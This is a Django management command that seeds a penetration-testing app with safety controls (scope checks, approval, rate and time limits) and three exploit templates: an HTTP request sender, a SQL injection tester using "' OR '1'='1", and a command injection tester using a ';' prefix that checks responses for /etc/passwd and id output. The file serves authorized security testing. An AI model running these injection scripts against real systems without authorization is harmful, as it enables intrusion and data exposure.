# manual_exploitation/management/commands/init_exploitation.py
from django.core.management.base import BaseCommand
from django.db import transaction
from manual_exploitation.models import SafetyControl, ExploitationTemplate
import logging

logger = logging.getLogger(__name__)

class Command(BaseCommand):
    help = 'Initialize data for the manual exploitation interface'

    def handle(self, *args, **kwargs):
        self.stdout.write('Initializing manual exploitation data...')
        
        with transaction.atomic():
            # Create default safety controls
            self._create_safety_controls()
            
            # Create default templates
            self._create_templates()
            
        self.stdout.write(self.style.SUCCESS('Successfully initialized manual exploitation data'))
    
    def _create_safety_controls(self):
        """Create default safety controls"""
        safety_controls = [
            {
                'name': 'Network Rate Limiting',
                'description': 'Limits the rate of network requests to prevent DoS conditions',
                'control_type': 'network_limit',
                'is_mandatory': True,
                'configuration': {
                    'max_requests_per_second': 10,
                    'max_connections': 5
                }
            },
            {
                'name': 'Execution Time Limit',
                'description': 'Limits the maximum execution time for any exploitation attempt',
                'control_type': 'time_limit',
                'is_mandatory': True,
                'configuration': {
                    'max_seconds': 300  # 5 minutes
                }
            },
            {
                'name': 'Target Verification',
                'description': 'Ensures the target is within authorized scope',
                'control_type': 'scope_limit',
                'is_mandatory': True,
                'configuration': {
                    'require_confirmation': True,
                    'check_ownership': True
                }
            },
            {
                'name': 'Resource Usage Limits',
                'description': 'Limits CPU and memory usage during exploitation',
                'control_type': 'resource_limit',
                'is_mandatory': False,
                'configuration': {
                    'max_cpu_percent': 80,
                    'max_memory_mb': 500
                }
            },
            {
                'name': 'Exploit Approval',
                'description': 'Requires approval before executing high-risk exploits',
                'control_type': 'approval',
                'is_mandatory': True,
                'configuration': {
                    'required_for_severity': ['HIGH', 'CRITICAL'],
                    'min_approvers': 1
                }
            },
            {
                'name': 'Evidence Collection',
                'description': 'Automatically collects evidence during exploitation',
                'control_type': 'other',
                'is_mandatory': True,
                'configuration': {
                    'capture_output': True,
                    'capture_traffic': True
                }
            }
        ]
        
        created_count = 0
        updated_count = 0
        
        for sc_data in safety_controls:
            sc, created = SafetyControl.objects.update_or_create(
                name=sc_data['name'],
                defaults={
                    'description': sc_data['description'],
                    'control_type': sc_data['control_type'],
                    'is_mandatory': sc_data['is_mandatory'],
                    'configuration': sc_data['configuration']
                }
            )
            
            if created:
                created_count += 1
            else:
                updated_count += 1
                
        self.stdout.write(f'Created {created_count} and updated {updated_count} safety controls')
    
    def _create_templates(self):
        """Create default exploitation templates"""
        templates = [
            {
                'name': 'Basic HTTP Exploitation',
                'description': 'Template for exploiting HTTP-based vulnerabilities',
                'exploit_type': 'web',
                'template_code': '''#!/usr/bin/env python3
import requests
import argparse
import sys
import time

def main():
    parser = argparse.ArgumentParser(description='HTTP Exploitation Template')
    parser.add_argument('--target', required=True, help='Target URL/IP')
    parser.add_argument('--path', default='/', help='Target path')
    parser.add_argument('--method', default='GET', help='HTTP method')
    parser.add_argument('--payload', help='Payload to send')
    parser.add_argument('--headers', help='Custom headers (JSON string)')
    args = parser.parse_args()
    
    target_url = args.target
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    url = target_url.rstrip('/') + '/' + args.path.lstrip('/')
    print(f"[*] Targeting URL: {url}")
    
    # Setup request
    method = args.method.upper()
    headers = {}
    if args.headers:
        import json
        try:
            headers = json.loads(args.headers)
        except json.JSONDecodeError:
            print("[!] Error parsing headers JSON")
            return False
    
    # Execute exploitation
    try:
        print(f"[*] Sending {method} request...")
        if method == 'GET':
            response = requests.get(url, headers=headers, timeout=10)
        elif method == 'POST':
            response = requests.post(url, data=args.payload, headers=headers, timeout=10)
        elif method == 'PUT':
            response = requests.put(url, data=args.payload, headers=headers, timeout=10)
        else:
            print(f"[!] Unsupported method: {method}")
            return False
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        print(f"[*] Response body: {response.text[:1000]}...")
        
        if response.status_code < 400:
            print("[+] Exploitation likely successful!")
            return True
        else:
            print("[!] Exploitation might have failed")
            return False
            
    except Exception as e:
        print(f"[!] Error during exploitation: {str(e)}")
        return False

if __name__ == '__main__':
    success = main()
    sys.exit(0 if success else 1)
''',
                'parameters': {
                    'path': '/',
                    'method': 'GET',
                    'payload': '',
                    'headers': '{}'
                }
            },
            {
                'name': 'SQL Injection Tester',
                'description': 'Template for testing and exploiting SQL injection vulnerabilities',
                'exploit_type': 'sqli',
                'template_code': '''#!/usr/bin/env python3
import requests
import argparse
import sys
import time
import urllib.parse

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Exploitation Template')
    parser.add_argument('--target', required=True, help='Target URL/IP')
    parser.add_argument('--parameter', required=True, help='Vulnerable parameter')
    parser.add_argument('--method', default='GET', help='HTTP method')
    parser.add_argument('--path', default='/', help='Target path')
    parser.add_argument('--payload', default="' OR '1'='1", help='SQL injection payload')
    parser.add_argument('--cookie', help='Cookie string')
    args = parser.parse_args()
    
    target_url = args.target
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    url = target_url.rstrip('/') + '/' + args.path.lstrip('/')
    print(f"[*] Testing SQL injection at: {url}")
    print(f"[*] Vulnerable parameter: {args.parameter}")
    print(f"[*] Using payload: {args.payload}")
    
    # Setup request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    if args.cookie:
        headers['Cookie'] = args.cookie
    
    # Execute exploitation
    try:
        if args.method.upper() == 'GET':
            # Add payload to parameter in query string
            if '?' in url:
                base_url, query_string = url.split('?', 1)
                params = {}
                for param in query_string.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Inject payload into specified parameter
                params[args.parameter] = args.payload
                
                # Rebuild query string
                new_query = '&'.join([f"{k}={urllib.parse.quote(v)}" for k, v in params.items()])
                exploit_url = f"{base_url}?{new_query}"
            else:
                # No existing parameters, add our own
                exploit_url = f"{url}?{args.parameter}={urllib.parse.quote(args.payload)}"
                
            print(f"[*] GET request to: {exploit_url}")
            response = requests.get(exploit_url, headers=headers, timeout=15)
        else:
            # Use POST method
            data = {args.parameter: args.payload}
            print(f"[*] POST request to {url} with data: {data}")
            response = requests.post(url, data=data, headers=headers, timeout=15)
        
        print(f"[*] Response status: {response.status_code}")
        
        # Check for common SQL error messages that indicate successful injection
        sql_errors = [
            "syntax error", "sql syntax", "mysql", "postgresql", 
            "ORA-", "SQL Server", "sqlite3"
        ]
        
        for error in sql_errors:
            if error.lower() in response.text.lower():
                print(f"[+] SQL error detected in response: {error}")
                print("[+] Vulnerability confirmed!")
                return True
        
        print("[*] No obvious SQL errors found in response")
        print("[*] Check the application behavior to confirm exploitation")
        return True
            
    except Exception as e:
        print(f"[!] Error during exploitation: {str(e)}")
        return False

if __name__ == '__main__':
    success = main()
    sys.exit(0 if success else 1)
''',
                'parameters': {
                    'parameter': 'id',
                    'method': 'GET',
                    'path': '/',
                    'payload': "' OR '1'='1"
                }
            },
            {
                'name': 'Command Injection Tester',
                'description': 'Template for testing and exploiting command injection vulnerabilities',
                'exploit_type': 'cmdi',
                'template_code': '''#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib.parse
import re

def main():
    parser = argparse.ArgumentParser(description='Command Injection Exploitation Template')
    parser.add_argument('--target', required=True, help='Target URL/IP')
    parser.add_argument('--parameter', required=True, help='Vulnerable parameter')
    parser.add_argument('--method', default='GET', help='HTTP method')
    parser.add_argument('--path', default='/', help='Target path')
    parser.add_argument('--payload', default="ping -c 2 127.0.0.1", help='Command to inject')
    parser.add_argument('--prefix', default='', help='Prefix for command injection (e.g., ;, |, ||)')
    parser.add_argument('--suffix', default='', help='Suffix for command injection')
    args = parser.parse_args()
    
    target_url = args.target
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    url = target_url.rstrip('/') + '/' + args.path.lstrip('/')
    
    # Construct the full injection payload
    injection = f"{args.prefix}{args.payload}{args.suffix}"
    print(f"[*] Testing command injection at: {url}")
    print(f"[*] Vulnerable parameter: {args.parameter}")
    print(f"[*] Using payload: {injection}")
    
    # Setup request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    # Execute exploitation
    try:
        if args.method.upper() == 'GET':
            # Add payload to parameter in query string
            if '?' in url:
                base_url, query_string = url.split('?', 1)
                params = {}
                for param in query_string.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Inject payload into specified parameter
                params[args.parameter] = injection
                
                # Rebuild query string
                new_query = '&'.join([f"{k}={urllib.parse.quote(v)}" for k, v in params.items()])
                exploit_url = f"{base_url}?{new_query}"
            else:
                # No existing parameters, add our own
                exploit_url = f"{url}?{args.parameter}={urllib.parse.quote(injection)}"
                
            print(f"[*] GET request to: {exploit_url}")
            response = requests.get(exploit_url, headers=headers, timeout=15)
        else:
            # Use POST method
            data = {args.parameter: injection}
            print(f"[*] POST request to {url} with data: {data}")
            response = requests.post(url, data=data, headers=headers, timeout=15)
        
        print(f"[*] Response status: {response.status_code}")
        
        # Check for evidence of successful command injection
        evidence_patterns = [
            # Look for ping response times
            r"PING 127\.0\.0\.1 .* time=",
            # Common command output patterns
            r"uid=\d+\(.*\) gid=\d+\(.*\)",  # id command
            r"total \d+",  # ls command
            r"Linux .* [0-9.]+ #",  # uname
            r"root:x:0:0"  # /etc/passwd
        ]
        
        success = False
        for pattern in evidence_patterns:
            if re.search(pattern, response.text):
                print(f"[+] Command output detected in response! Pattern: {pattern}")
                success = True
        
        if success:
            print("[+] Command injection vulnerability confirmed!")
            return True
        else:
            print("[*] No obvious command output found in response")
            print("[*] Check the application behavior to confirm exploitation")
            return True
            
    except Exception as e:
        print(f"[!] Error during exploitation: {str(e)}")
        return False

if __name__ == '__main__':
    success = main()
    sys.exit(0 if success else 1)
''',
                'parameters': {
                    'parameter': 'cmd',
                    'method': 'GET',
                    'path': '/',
                    'payload': 'ping -c 2 127.0.0.1',
                    'prefix': ';',
                    'suffix': ''
                }
            }
        ]
        
        created_count = 0
        updated_count = 0
        
        for tmpl_data in templates:
            template, created = ExploitationTemplate.objects.update_or_create(
                name=tmpl_data['name'],
                defaults={
                    'description': tmpl_data['description'],
                    'exploit_type': tmpl_data['exploit_type'],
                    'template_code': tmpl_data['template_code'],
                    'parameters': tmpl_data['parameters']
                }
            )
            
            # Add required safety controls
            if created:
                # All templates require approval
                approval_control = SafetyControl.objects.filter(control_type='approval').first()
                if approval_control:
                    template.required_safety_controls.add(approval_control)
                
                # All templates require time limits
                time_control = SafetyControl.objects.filter(control_type='time_limit').first()
                if time_control:
                    template.required_safety_controls.add(time_control)
                
                created_count += 1
            else:
                updated_count += 1
                
        self.stdout.write(f'Created {created_count} and updated {updated_count} exploitation templates')